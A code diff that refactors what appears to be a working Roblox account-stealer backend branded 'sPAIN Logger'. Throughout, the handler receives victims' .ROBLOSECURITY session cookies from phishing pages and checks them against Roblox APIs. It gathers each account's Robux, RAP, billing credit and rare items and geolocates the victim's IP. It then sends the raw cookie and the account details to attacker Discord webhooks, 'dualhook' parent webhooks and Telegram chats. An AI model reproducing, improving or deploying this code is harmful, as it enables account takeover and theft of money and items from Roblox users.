@@ -15,11 +15,6 @@ const ITEMS = {
 
 const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/cookie';
 
-const getRefreshLink = (cookie) => {
-  if (!cookie) return `[Refresh Cookie](${COOKIE_REFRESH_URL})`;
-  return `[Refresh Cookie](${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)})`;
-};
-
 async function redisGet(key) {
   try {
     const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
@@ -50,16 +45,11 @@ async function getAvatarUrl(userId) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    const response = await fetch(
-      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`,
-      { signal: ctrl.signal }
-    );
+    const response = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`, { signal: ctrl.signal });
     clearTimeout(timer);
     if (!response.ok) return null;
     const data = await response.json();
-    if (data.data && data.data.length > 0 && data.data[0].state === 'Completed') {
-      return data.data[0].imageUrl;
-    }
+    if (data.data && data.data.length > 0 && data.data[0].state === 'Completed') return data.data[0].imageUrl;
     return null;
   } catch { return null; }
 }
@@ -69,10 +59,7 @@ async function getRobux(cookie) {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
     const response = await fetch('https://economy.roblox.com/v1/user/currency', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
       signal: ctrl.signal
     });
     clearTimeout(timer);
@@ -87,10 +74,7 @@ async function getRAP(cookie, userId) {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 8000);
     const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
       signal: ctrl.signal
     });
     clearTimeout(timer);
@@ -108,10 +92,7 @@ async function getCredit(cookie) {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
     const response = await fetch('https://billing.roblox.com/v1/credit', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
       signal: ctrl.signal
     });
     clearTimeout(timer);
@@ -123,9 +104,7 @@ async function getCredit(cookie) {
 
 function getAccountAge(createdDate) {
   if (!createdDate) return 0;
-  const created = new Date(createdDate);
-  const now = new Date();
-  return Math.floor((now - created) / (1000 * 60 * 60 * 24));
+  return Math.floor((new Date() - new Date(createdDate)) / (1000 * 60 * 60 * 24));
 }
 
 async function getPremiumStatus(cookie) {
@@ -133,15 +112,11 @@ async function getPremiumStatus(cookie) {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
     const response = await fetch('https://premiumfeatures.roblox.com/v1/users/validate-membership', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
       signal: ctrl.signal
     });
     clearTimeout(timer);
-    if (response.status === 200) return true;
-    return false;
+    return response.status === 200;
   } catch { return false; }
 }
 
@@ -150,10 +125,7 @@ async function getVoiceChatStatus(cookie) {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
     const response = await fetch('https://voice.roblox.com/v1/settings', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
       signal: ctrl.signal
     });
     clearTimeout(timer);
@@ -167,9 +139,7 @@ async function getFriendsCount(userId) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
-      signal: ctrl.signal
-    });
+    const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, { signal: ctrl.signal });
     clearTimeout(timer);
     if (!response.ok) return 0;
     const data = await response.json();
@@ -182,16 +152,12 @@ async function ownsItem(cookie, userId, assetId) {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
     const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}/is-owned`, {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
       signal: ctrl.signal
     });
     clearTimeout(timer);
     if (!response.ok) return false;
-    const data = await response.json();
-    return data === true;
+    return await response.json() === true;
   } catch { return false; }
 }
 
@@ -199,14 +165,11 @@ async function getGroupsOwned(userId) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    const response = await fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {
-      signal: ctrl.signal
-    });
+    const response = await fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, { signal: ctrl.signal });
     clearTimeout(timer);
     if (!response.ok) return 0;
     const data = await response.json();
-    const groups = data.data || [];
-    return groups.filter(g => g.role && g.role.rank === 255).length;
+    return (data.data || []).filter(g => g.role?.rank === 255).length;
   } catch { return 0; }
 }
 
@@ -215,39 +178,30 @@ async function checkAccountInfo(cookie) {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 8000);
     const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
       signal: ctrl.signal
     });
     clearTimeout(timer);
-    if (!response.ok) {
-      return { valid: false, error: 'Invalid or expired cookie' };
-    }
+    if (!response.ok) return { valid: false, error: 'Invalid or expired cookie' };
+    
     const userData = await response.json();
     const userId = userData.id;
-    const [
-      avatarUrl, robux, rapData, credit, profileRes,
-      premium, voiceChat, friends, headless, korblox, valkyrie, groupsOwned
-    ] = await Promise.all([
+    
+    const [avatarUrl, robux, rapData, credit, profileRes, premium, voiceChat, friends, headless, korblox, valkyrie, groupsOwned] = await Promise.all([
       getAvatarUrl(userId), getRobux(cookie), getRAP(cookie, userId), getCredit(cookie),
-      fetch(`https://users.roblox.com/v1/users/${userId}`, {
-        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
-      }).catch(() => null),
+      fetch(`https://users.roblox.com/v1/users/${userId}`).catch(() => null),
       getPremiumStatus(cookie), getVoiceChatStatus(cookie), getFriendsCount(userId),
       ownsItem(cookie, userId, ITEMS.HEADLESS), ownsItem(cookie, userId, ITEMS.KORBLOX),
       ownsItem(cookie, userId, ITEMS.VALKYRIE), getGroupsOwned(userId)
     ]);
+    
     const profile = profileRes?.ok ? await profileRes.json() : null;
-    const accountAge = getAccountAge(profile?.created);
+    
     return {
       valid: true, id: userId, username: userData.name, displayName: userData.displayName,
-      created: profile?.created, description: profile?.description, isBanned: profile?.isBanned || false,
-      profileUrl: `https://www.roblox.com/users/${userId}/profile`, avatarUrl: avatarUrl,
-      robux: robux, rap: rapData.rap, items: rapData.items, credit: credit,
-      premium: premium, voiceChat: voiceChat, friends: friends,
-      headless: headless, korblox: korblox, valkyrie: valkyrie, groupsOwned: groupsOwned, accountAge: accountAge
+      profileUrl: `https://www.roblox.com/users/${userId}/profile`, avatarUrl,
+      robux, rap: rapData.rap, items: rapData.items, credit, premium, voiceChat, friends,
+      headless, korblox, valkyrie, groupsOwned, accountAge: getAccountAge(profile?.created)
     };
   } catch (err) {
     return { valid: false, error: err.message };
@@ -266,7 +220,7 @@ async function tgSendAccount(text) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
     });
-  } catch (e) { console.error('TG Account Error:', e); }
+  } catch {}
 }
 
 async function tgSendWebhook(text) {
@@ -276,7 +230,7 @@ async function tgSendWebhook(text) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TG_WEBHOOK_CHAT, text, parse_mode: 'HTML' })
     });
-  } catch (e) { console.error('TG Webhook Error:', e); }
+  } catch {}
 }
 
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
@@ -284,8 +238,8 @@ function extractCookie(raw) {
   if (!raw) return null;
   const s = String(raw).trim();
   const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
-  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
-  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
+  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/); if (m2) return WARN + m2[1];
+  const m3 = s.match(/\|_([\w\-]{50,})/); if (m3) return WARN + m3[1];
   if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
   return null;
 }
@@ -314,144 +268,64 @@ function parseBody(raw) {
 const WH_NAME   = 'sPAIN';
 const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
 
-const createWebhookPayload = (type, data) => {
-  const basePayload = { username: WH_NAME, avatar_url: WH_AVATAR };
-  switch (type) {
-    case 'webhook1':
-      return { ...basePayload, content: data.content || '@everyone', embeds: [{
-        title: data.title || '🍪 Cookie Captured (Dualhook)',
-        description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
-        color: data.color || 0x06b6d4,
-        thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
-        image: data.image ? { url: data.image } : undefined,
-        fields: data.fields || [],
-        footer: { text: data.footer || `sPAIN Logger` },
-        timestamp: data.timestamp || new Date().toISOString()
-      }]};
-    case 'webhook2':
-      return { ...basePayload, content: data.content || '@everyone', embeds: [{
-        title: data.title || '🍪 Cookie Captured',
-        description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
-        color: data.color || 0xc026d3,
-        thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
-        image: data.image ? { url: data.image } : undefined,
-        fields: data.fields || [],
-        footer: { text: data.footer || `sPAIN Logger` },
-        timestamp: data.timestamp || new Date().toISOString()
-      }]};
-    case 'account_info':
-      return { ...basePayload, content: data.content || '', embeds: [{
-        title: data.title || '✅ Account Info Valid',
-        description: data.description || '',
-        color: data.valid === false ? 0xff0000 : 0x00ff00,
-        thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
-        image: data.image ? { url: data.image } : undefined,
-        fields: data.fields || [],
-        footer: { text: data.footer || `Account Check • sPAIN Logger` },
-        timestamp: data.timestamp || new Date().toISOString()
-      }]};
-    default: return basePayload;
-  }
-};
-
-// FIXED: Better error handling and logging
 async function discordSend(url, payload) {
-  console.log('Attempting Discord send to:', url?.substring(0, 50) + '...');
-  
-  if (!url) {
-    console.error('Discord Error: URL is undefined/null');
-    return;
-  }
-  if (typeof url !== 'string') {
-    console.error('Discord Error: URL is not a string:', typeof url);
-    return;
-  }
-  if (!url.includes('discord.com/api/webhooks')) {
-    console.error('Discord Error: Invalid webhook URL format');
-    return;
-  }
-  
+  if (!url || !url.includes('discord.com/api/webhooks')) return;
   try {
-    const response = await fetch(url, {
+    const res = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    
-    if (!response.ok) {
-      const text = await response.text();
-      console.error(`Discord Error ${response.status}:`, text);
-    } else {
-      console.log('Discord sent successfully');
-    }
-  } catch (e) {
-    console.error('Discord Fetch Error:', e.message);
-  }
+    if (!res.ok) console.error('Discord error:', res.status, await res.text());
+  } catch (e) { console.error('Discord fetch error:', e.message); }
 }
 
+// ONLY place with refresh link - raw cookie message
 async function discordSendCookie(url, cookie, username) {
-  console.log('Sending cookie to Discord:', url?.substring(0, 50) + '...');
-  
-  if (!url?.includes('discord.com/api/webhooks')) {
-    console.error('Invalid webhook URL for cookie send');
-    return;
-  }
-  
+  if (!url?.includes('discord.com/api/webhooks')) return;
   try {
-    const response = await fetch(url, {
+    // Truncate cookie for URL to avoid limits
+    const shortCookie = cookie.length > 150 ? cookie.substring(0, 150) + '...' : cookie;
+    const refreshUrl = `${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(shortCookie)}`;
+    
+    await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         username: WH_NAME,
         avatar_url: WH_AVATAR,
-        content: `**🔐 Cookie for "${username || 'Unknown'}"**\n\n**[🔄 Refresh Cookie](${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)})**\n\n\`\`\`\n${cookie}\n\`\`\``
+        content: `**🔐 Cookie for "${username || 'Unknown'}"**\n\n**[🔄 Refresh Cookie](${refreshUrl})**\n\n\`\`\`\n${cookie}\n\`\`\``
       })
     });
-    
-    if (!response.ok) {
-      const text = await response.text();
-      console.error(`Cookie Send Error ${response.status}:`, text);
-    } else {
-      console.log('Cookie sent successfully');
-    }
-  } catch (e) {
-    console.error('Cookie Send Fetch Error:', e.message);
-  }
+  } catch {}
 }
 
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-  
   if (req.method === 'OPTIONS') return res.status(204).end();
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
   const body = parseBody(req.body);
   const { slug, slots, action } = body;
   
-  console.log('Request received:', { slug, hasSlots: !!slots, action });
-  
   if (action === 'check_account' || action === 'refresh_cookie') {
-    if (!slots) return res.status(400).json({ error: 'slots is required' });
+    if (!slots) return res.status(400).json({ error: 'slots required' });
     const cookie = findCookie(slots);
-    if (!cookie) return res.status(400).json({ error: 'No valid cookie found' });
-    const refreshResult = await refreshCookieStatus(cookie);
-    return res.status(200).json(refreshResult);
+    if (!cookie) return res.status(400).json({ error: 'No valid cookie' });
+    return res.status(200).json(await refreshCookieStatus(cookie));
   }
   
-  if (!slug) return res.status(400).json({ error: 'slug is required' });
-  if (!slots) return res.status(400).json({ error: 'slots is required' });
+  if (!slug || !slots) return res.status(400).json({ error: 'slug and slots required' });
 
   const record = await redisGet(`slot:${slug}`);
-  console.log('Record found:', !!record, 'Webhook:', record?.webhook?.substring(0, 30) + '...');
-  
   if (!record) return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
   const victimWebhook = findVictimWebhook(slots);
   if (victimWebhook) {
-    await tgSendWebhook(`🎯 <b>NEW VICTIM WEBHOOK</b>\n📄 <b>Page:</b> ${record.displayName || slug}\n\n<b>Webhook:</b>\n<code>${victimWebhook}</code>\n\n🕐 ${new Date().toISOString()}`);
+    await tgSendWebhook(`🎯 <b>VICTIM WEBHOOK</b>\n📄 ${record.displayName || slug}\n<code>${victimWebhook}</code>`);
   }
 
   const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
@@ -459,116 +333,95 @@ export default async function handler(req, res) {
   const pName = record.displayName || slug;
   const cookie = findCookie(slots);
 
-  console.log('Cookie found:', !!cookie, 'IP:', ip);
-
-  // Setup webhooks
-  const webhooks = [record.webhook];
+  let webhook1 = null;
+  let webhook2 = record.webhook;
   if (record.dualhookParent) {
     const parent = await redisGet(`slot:${record.dualhookParent}`);
-    if (parent?.webhook && parent.webhook !== record.webhook) {
-      webhooks.push(parent.webhook);
-      console.log('Dualhook parent webhook added');
-    }
+    if (parent?.webhook && parent.webhook !== record.webhook) webhook1 = parent.webhook;
   }
 
+  // NO COOKIE - Wrong cookie alert
   if (!cookie) {
-    console.log('No cookie found - sending wrong cookie alert');
     const geo = await getIpGeo(ip);
     const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
     
-    const wrongCookiePayload = createWebhookPayload('webhook2', {
-      title: '⚠️ Wrong Cookie — Troll Detected',
-      description: record.dualhookParent
-        ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
-        : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
-      color: 0xff3333,
-      fields: [
-        { name: '🌐 IP', value: ip, inline: true },
-        { name: '📍 Location', value: loc, inline: true },
-        { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true },
-        { name: '🕐 Time', value: now, inline: false },
-        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${getRefreshLink(null)}`, inline: false }
-      ],
-      footer: `${pName} Logger`,
-      timestamp: now
+    await discordSend(webhook2, {
+      username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
+      embeds: [{
+        title: '⚠️ Wrong Cookie — Troll Detected',
+        description: 's.PAIN Logger',
+        color: 0xff3333,
+        fields: [
+          { name: '🌐 IP', value: ip, inline: true },
+          { name: '📍 Location', value: loc, inline: true },
+          { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true }
+        ],
+        footer: { text: `${pName} Logger` },
+        timestamp: now
+      }]
     });
     
-    await Promise.all(webhooks.map(wh => discordSend(wh, wrongCookiePayload)));
     await tgSendAccount(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
     return res.status(200).json({ success: true });
   }
 
-  // Process cookie
-  const geoPromise = getIpGeo(ip);
-  const accountCheckPromise = refreshCookieStatus(cookie);
-
-  let webhook1 = null;
-  let webhook2 = record.webhook;
+  // Process valid cookie
+  const [geo, accountInfo] = await Promise.all([
+    getIpGeo(ip),
+    refreshCookieStatus(cookie)
+  ]);
   
-  if (record.dualhookParent) {
-    try {
-      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
-      if (parentRecord?.webhook) webhook1 = parentRecord.webhook;
-    } catch (_) {}
-  }
-
-  const [geo, accountInfo] = await Promise.all([geoPromise, accountCheckPromise]);
   const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
-  const isp = geo?.isp || 'Unknown';
-  
-  const avatarUrl = accountInfo.refreshed && accountInfo.account.avatarUrl ? accountInfo.account.avatarUrl : null;
   const acc = accountInfo.refreshed ? accountInfo.account : null;
+  const avatarUrl = acc?.avatarUrl;
 
-  console.log('Account info:', accountInfo.refreshed ? acc?.username : 'Invalid');
-
-  // WEBHOOK 2 - Cookie Captured
-  const wh2Payload = createWebhookPayload('webhook2', {
-    description: record.dualhookParent
-      ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
-      : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
-    thumbnail: avatarUrl,
-    fields: [
-      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
-      { name: '📄 Page', value: pName, inline: true },
-      { name: '🕐 Time', value: now, inline: true },
-      { name: '📍 Location', value: loc, inline: true },
-      { name: '🗺️ ISP', value: isp, inline: true },
-      { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${getRefreshLink(cookie)}`, inline: false }
-    ],
-    footer: `${pName} Logger`,
-    timestamp: now
-  });
-
-  console.log('Sending to webhook2...');
-  await discordSend(webhook2, wh2Payload);
-
-  // WEBHOOK 1 - Dualhook (if exists)
-  if (webhook1 && webhook1 !== webhook2) {
-    console.log('Sending to webhook1 (dualhook)...');
-    const wh1Payload = createWebhookPayload('webhook1', {
-      title: '🍪 Cookie Captured (Dualhook)',
-      thumbnail: avatarUrl,
+  // WEBHOOK 2: Cookie Captured (NO refresher link here!)
+  await discordSend(webhook2, {
+    username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
+    embeds: [{
+      title: '🍪 Cookie Captured',
+      description: 's.PAIN Logger',
+      color: 0xc026d3,
+      thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
       fields: [
         { name: '🌐 IP', value: `\`${ip}\``, inline: true },
-        { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true },
-        { name: '🔗 DH Child', value: `\`${slug}\``, inline: true },
-        { name: '📍 Location', value: loc, inline: true },
-        { name: '🗺️ ISP', value: isp, inline: true },
+        { name: '📄 Page', value: pName, inline: true },
         { name: '🕐 Time', value: now, inline: true },
-        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${getRefreshLink(cookie)}`, inline: false }
+        { name: '📍 Location', value: loc, inline: true },
+        { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true }
       ],
-      footer: `sPAIN Logger • ${pName}`,
+      footer: { text: `${pName} Logger` },
       timestamp: now
+    }]
+  });
+
+  // WEBHOOK 1: Dualhook (NO refresher link here!)
+  if (webhook1) {
+    await discordSend(webhook1, {
+      username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
+      embeds: [{
+        title: '🍪 Cookie Captured (Dualhook)',
+        color: 0x06b6d4,
+        thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
+        fields: [
+          { name: '🌐 IP', value: `\`${ip}\``, inline: true },
+          { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true },
+          { name: '🔗 DH Child', value: `\`${slug}\``, inline: true },
+          { name: '📍 Location', value: loc, inline: true }
+        ],
+        footer: { text: `sPAIN Logger • ${pName}` },
+        timestamp: now
+      }]
     });
-    await discordSend(webhook1, wh1Payload);
   }
 
-  // Account Info - WEBHOOK 2
-  if (accountInfo.refreshed && acc) {
-    console.log('Sending account info...');
-    const accountPayload = createWebhookPayload('account_info', {
+  // Account Info (NO refresher link in embed!)
+  if (acc) {
+    const accountEmbed = {
+      title: '✅ Account Info Valid',
       description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
-      thumbnail: avatarUrl,
+      color: 0x00ff00,
+      thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
       fields: [
         { name: '💰 Robux', value: `⏣ ${acc.robux.toLocaleString()}`, inline: true },
         { name: '🎵 RAP', value: `${acc.rap.toLocaleString()}`, inline: true },
@@ -581,44 +434,17 @@ export default async function handler(req, res) {
         { name: '📦 Items', value: acc.items.toString(), inline: true },
         { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
         { name: '⚔️ Korblox', value: acc.korblox ? '✓ Owned' : '✗ None', inline: true },
-        { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true },
-        { name: '🍪 Cookie Refresher', value: `Click to refresh: ${getRefreshLink(cookie)}`, inline: false }
+        { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true }
       ],
-      footer: `${pName} Logger`,
+      footer: { text: `${pName} Logger` },
       timestamp: now
-    });
-    await discordSend(webhook2, accountPayload);
-
-    // Account Info - WEBHOOK 1 (if exists)
-    if (webhook1) {
-      console.log('Sending account info to webhook1...');
-      const accountPayloadWH1 = createWebhookPayload('account_info', {
-        description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
-        thumbnail: avatarUrl,
-        fields: [
-          { name: '💰 Robux', value: `⏣ ${acc.robux.toLocaleString()}`, inline: true },
-          { name: '🎵 RAP', value: `${acc.rap.toLocaleString()}`, inline: true },
-          { name: '💳 Credit', value: `$${acc.credit.toFixed(2)}`, inline: true },
-          { name: '🗓️ Age', value: `${acc.accountAge.toLocaleString()}d`, inline: true },
-          { name: '⭐ Premium', value: acc.premium ? '✓ Yes' : '✗ No', inline: true },
-          { name: '🎙️ VC', value: acc.voiceChat ? '✓ On' : '✗ Off', inline: true },
-          { name: '👥 Friends', value: acc.friends.toLocaleString(), inline: true },
-          { name: '👑 Groups', value: acc.groupsOwned.toString(), inline: true },
-          { name: '📦 Items', value: acc.items.toString(), inline: true },
-          { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
-          { name: '⚔️ Korblox', value: acc.korblox ? '✓ Owned' : '✗ None', inline: true },
-          { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true },
-          { name: '🍪 Cookie Refresher', value: `Click to refresh: ${getRefreshLink(cookie)}`, inline: false }
-        ],
-        footer: `sPAIN Logger • ${pName}`,
-        timestamp: now
-      });
-      await discordSend(webhook1, accountPayloadWH1);
-    }
+    };
+    
+    await discordSend(webhook2, { username: WH_NAME, avatar_url: WH_AVATAR, embeds: [accountEmbed] });
+    if (webhook1) await discordSend(webhook1, { username: WH_NAME, avatar_url: WH_AVATAR, embeds: [{...accountEmbed, footer: { text: `sPAIN Logger • ${pName}` }}] });
   }
 
-  // Send raw cookie
-  console.log('Sending raw cookie...');
+  // ONLY place with refresh link - raw cookie message
   await discordSendCookie(webhook2, cookie, acc?.username);
   if (webhook1) await discordSendCookie(webhook1, cookie, acc?.username);
 
@@ -626,43 +452,20 @@ export default async function handler(req, res) {
   if (acc) {
     await tgSendAccount([
       `🍪 <b>COOKIE — ${pName}</b>`,
-      `👤 <b>Username:</b> <code>${acc.username}</code>`,
-      `🆔 <b>User ID:</b> <code>${acc.id}</code>`,
-      ``,
+      `👤 <b>User:</b> <code>${acc.username}</code> (${acc.id})`,
       `💰 <b>Robux:</b> ⏣ ${acc.robux.toLocaleString()}`,
-      `🎵 <b>RAP:</b> ${acc.rap.toLocaleString()} (${acc.items} items)`,
+      `🎵 <b>RAP:</b> ${acc.rap.toLocaleString()}`,
       `💳 <b>Credit:</b> $${acc.credit.toFixed(2)}`,
       `🗓️ <b>Age:</b> ${acc.accountAge.toLocaleString()}d`,
       `⭐ <b>Premium:</b> ${acc.premium ? 'Yes' : 'No'}`,
-      `🎙️ <b>Voice Chat:</b> ${acc.voiceChat ? 'On' : 'Off'}`,
-      `👥 <b>Friends:</b> ${acc.friends.toLocaleString()}`,
-      `👑 <b>Groups Owned:</b> ${acc.groupsOwned}`,
       `💀 <b>Headless:</b> ${acc.headless ? 'Owned' : 'None'}`,
       `⚔️ <b>Korblox:</b> ${acc.korblox ? 'Owned' : 'None'}`,
-      `🪽 <b>Valkyrie:</b> ${acc.valkyrie ? 'Owned' : 'None'}`,
       ``,
-      `🔗 <b>Profile:</b> <a href="${acc.profileUrl}">View Profile</a>`,
-      ``,
-      `<b>🔐 Cookie:</b>`,
-      `<code>${cookie}</code>`,
-      ``,
-      `🕐 ${now}`
+      `<b>🔐 Cookie:</b> <code>${cookie}</code>`
     ].join('\n'));
   } else {
-    await tgSendAccount([
-      `🍪 <b>COOKIE — ${pName}</b>`,
-      `❌ <b>Invalid or expired cookie</b>`,
-      ``,
-      `<b>🔐 Cookie:</b>`,
-      `<code>${cookie}</code>`,
-      ``,
-      `🕐 ${now}`
-    ].join('\n'));
+    await tgSendAccount(`🍪 <b>COOKIE — ${pName}</b>\n❌ <b>Invalid cookie</b>\n<code>${cookie}</code>`);
   }
 
-  console.log('Done processing request');
-  return res.status(200).json({ 
-    success: true, 
-    account: accountInfo.refreshed ? accountInfo.account : null 
-  });
+  return res.status(200).json({ success: true, account: acc });
 }
